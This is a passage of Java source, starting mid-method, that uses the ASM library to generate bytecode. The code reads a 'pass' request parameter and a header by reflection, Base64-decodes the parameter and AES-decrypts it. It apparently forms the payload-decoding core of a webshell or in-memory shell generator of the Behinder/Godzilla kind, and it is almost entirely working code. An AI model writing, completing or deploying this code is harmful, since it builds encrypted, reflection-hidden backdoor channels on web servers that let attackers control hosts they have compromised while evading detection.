                "()Ljava/lang/ClassLoader;", false);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Class", "forName",
                "(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;", false);
        mv.visitVarInsn(Opcodes.ASTORE, cipherClassIndex); // Store cipherClass in local var 14

        // Class<?> secretKeySpecClass =
        // Class.forName("javax.crypto.spec.SecretKeySpec"...
        mv.visitLdcInsn("javax.crypto.spec.SecretKeySpec");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Thread", "currentThread", "()Ljava/lang/Thread;", false);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Thread", "getContextClassLoader",
                "()Ljava/lang/ClassLoader;", false);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Class", "forName",
                "(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;", false);
        mv.visitVarInsn(Opcodes.ASTORE, secretKeySpecClassIndex); // Store secretKeySpecClass in local var 15

        // Class<?> keyClass = Class.forName("java.security.Key"...
        mv.visitLdcInsn("java.security.Key");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Thread", "currentThread", "()Ljava/lang/Thread;", false);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Thread", "getContextClassLoader",
                "()Ljava/lang/ClassLoader;", false);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Class", "forName",
                "(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;", false);
        mv.visitVarInsn(Opcodes.ASTORE, keyClassIndex); // Store keyClass in local var 16

        // Get cipher methods
        // Method cipherInitMethod = cipherClass.getMethod("init", int.class, keyClass);
        mv.visitVarInsn(Opcodes.ALOAD, cipherClassIndex); // Load cipherClass
        mv.visitLdcInsn("init");
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/Integer", "TYPE", "Ljava/lang/Class;");
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitVarInsn(Opcodes.ALOAD, keyClassIndex); // Load keyClass
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ASTORE, cipherInitMethodIndex); // Store cipherInitMethod in local var 17

        // Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);
        mv.visitVarInsn(Opcodes.ALOAD, cipherClassIndex); // Load cipherClass
        mv.visitLdcInsn("doFinal");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("[B"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ASTORE, doFinalMethodIndex); // Store doFinalMethod in local var 18

        // Create cipher and secret key
        // Object cipher = cipherClass.getMethod("getInstance",
        // String.class).invoke(cipherClass, "AES");
        mv.visitVarInsn(Opcodes.ALOAD, cipherClassIndex); // Load cipherClass
        mv.visitLdcInsn("getInstance");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, cipherClassIndex); // Load cipherClass
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn("AES");
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitVarInsn(Opcodes.ASTORE, cipherIndex); // Store cipher in local var 19

        // Object secretKeySpec = secretKeySpecClass.getConstructor(byte[].class,
        // String.class)
        // .newInstance(key.getBytes(), "AES");
        mv.visitVarInsn(Opcodes.ALOAD, secretKeySpecClassIndex); // 加载 secretKeySpecClass
        mv.visitInsn(Opcodes.ICONST_2); // 构造函数参数数量为 2
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class"); // 创建 Class[] 数组
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0); // 数组索引 0
        mv.visitLdcInsn(Type.getType("[B")); // byte[].class
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1); // 数组索引 1
        mv.visitLdcInsn(Type.getType("Ljava/lang/String;")); // String.class
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getConstructor",
                "([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;", false);

        // 准备构造函数参数
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0); // 数组索引 0

        // 调用 key.getBytes()
        mv.visitVarInsn(Opcodes.ALOAD, keyIndex); // 加载 key
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "getBytes", "()[B", false);
        mv.visitInsn(Opcodes.AASTORE); // 存储 byte[] 到参数数组

        // 存储第二个参数 "AES"
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1); // 数组索引 1
        mv.visitLdcInsn("AES"); // 加载字符串 "AES"
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Constructor", "newInstance",
                "([Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitVarInsn(Opcodes.ASTORE, secretKeySpecIndex); // Store secretKeySpec in local var 20


        // Initialize cipher for decryption
        // cipherInitMethod.invoke(cipher, 2, secretKeySpec);
        mv.visitVarInsn(Opcodes.ALOAD, cipherInitMethodIndex); // Load
        // cipherInitMethod
        mv.visitVarInsn(Opcodes.ALOAD, cipherIndex); // Load cipher
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitInsn(Opcodes.ICONST_2); // Constant 2 for Cipher.DECRYPT_MODE
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Integer", "valueOf",
                "(I)Ljava/lang/Integer;", false);
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitVarInsn(Opcodes.ALOAD, secretKeySpecIndex); // Load secretKeySpec
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitInsn(Opcodes.POP);

        // Decrypt data
        // data = (byte[]) doFinalMethod.invoke(cipher, data);
        mv.visitVarInsn(Opcodes.ALOAD, doFinalMethodIndex); // Load doFinalMethod
        mv.visitVarInsn(Opcodes.ALOAD, cipherIndex); // Load cipher
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, dataIndex); // Load data
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "[B");
        mv.visitVarInsn(Opcodes.ASTORE, dataIndex); // Store updated data in local var 10
    }

    private void getParameterValue(int requestIndex, int passIndex, int curParameterIndex) {
        // String parameter = (String) request.getClass().getMethod("getParameter",
        // String.class).invoke(request, pass);
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("getParameter");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);

        // Invoke getParameter
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, passIndex); // Load pass
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "java/lang/String");
        mv.visitVarInsn(Opcodes.ASTORE, curParameterIndex); // Store parameter in local var 9
    }

    private void getHeaderValue(int requestIndex, int headerNameIndex, int curHeaderIndex) {
        // String value = (String) request.getClass().getMethod("getHeader",
        // String.class).invoke(request, headerName);
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request (first param)
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("getHeader");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);

        // Invoke getHeader
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, headerNameIndex); // Load headerName
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "java/lang/String");
        mv.visitVarInsn(Opcodes.ASTORE, curHeaderIndex); // Store value in local var 8
    }

    private void tryDecodeBase64(int base64ClassIndex, int decoderClassIndex, int curParameterIndex, int dataIndex,
                                 int base64ExceptionIndex) {
        // Try to use java.util.Base64 decoder first
        Label base64DecodeTrialStart = new Label();
        Label base64DecodeCatch = new Label();
        Label afterBase64Decode = new Label();

        mv.visitTryCatchBlock(base64DecodeTrialStart, base64DecodeCatch, base64DecodeCatch, "java/lang/Throwable");

        mv.visitLabel(base64DecodeTrialStart);

        // Class<?> clazz = Class.forName("java.util.Base64", true,
        // Thread.currentThread().getContextClassLoader());
        mv.visitLdcInsn("java.util.Base64");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Thread", "currentThread", "()Ljava/lang/Thread;", false);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Thread", "getContextClassLoader",
                "()Ljava/lang/ClassLoader;", false);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Class", "forName",
                "(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;", false);
        mv.visitVarInsn(Opcodes.ASTORE, base64ClassIndex); // Store Base64 class in local var 11

        // Object object = clazz.getMethod("getDecoder", new Class[0]).invoke(clazz,
        // null);
        mv.visitVarInsn(Opcodes.ALOAD, base64ClassIndex); // Load Base64 class
        mv.visitLdcInsn("getDecoder");
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, base64ClassIndex); // Load Base64 class as the target
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitVarInsn(Opcodes.ASTORE, decoderClassIndex); // Store decoder object in local var 12

        // byArray = (byte[])object.getClass().getMethod("decode",
        // String.class).invoke(object, string7);
        mv.visitVarInsn(Opcodes.ALOAD, decoderClassIndex); // Load decoder object
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("decode");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, decoderClassIndex); // Load decoder object
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, curParameterIndex); // Load parameter
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "[B");
        mv.visitVarInsn(Opcodes.ASTORE, dataIndex); // Store data in local var 10

        mv.visitJumpInsn(Opcodes.GOTO, afterBase64Decode);

        // Catch block for fallback to sun.misc.BASE64Decoder
        mv.visitLabel(base64DecodeCatch);
        mv.visitVarInsn(Opcodes.ASTORE, base64ExceptionIndex); // Store exception in local var 13

        // base64 = Class.forName("sun.misc.BASE64Decoder", true,
        // Thread.currentThread().getContextClassLoader());
        mv.visitLdcInsn("sun.misc.BASE64Decoder");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Thread", "currentThread", "()Ljava/lang/Thread;", false);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Thread", "getContextClassLoader",
                "()Ljava/lang/ClassLoader;", false);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Class", "forName",
                "(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;", false);
        mv.visitVarInsn(Opcodes.ASTORE, base64ClassIndex); // Store base64 class in local var 11

        // Object decoder = base64.newInstance();
        mv.visitVarInsn(Opcodes.ALOAD, base64ClassIndex); // Load base64 class
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "newInstance", "()Ljava/lang/Object;", false);
        mv.visitVarInsn(Opcodes.ASTORE, decoderClassIndex); // Store decoder in local var 12

        // data = (byte[]) decoder.getClass().getMethod("decodeBuffer",
        // String.class).invoke(decoder, parameter);
        mv.visitVarInsn(Opcodes.ALOAD, decoderClassIndex); // Load decoder
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("decodeBuffer");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, decoderClassIndex); // Load decoder
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, curParameterIndex); // Load parameter
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "[B");
        mv.visitVarInsn(Opcodes.ASTORE, dataIndex); // Store data in local var 10

        mv.visitLabel(afterBase64Decode);
    }
}
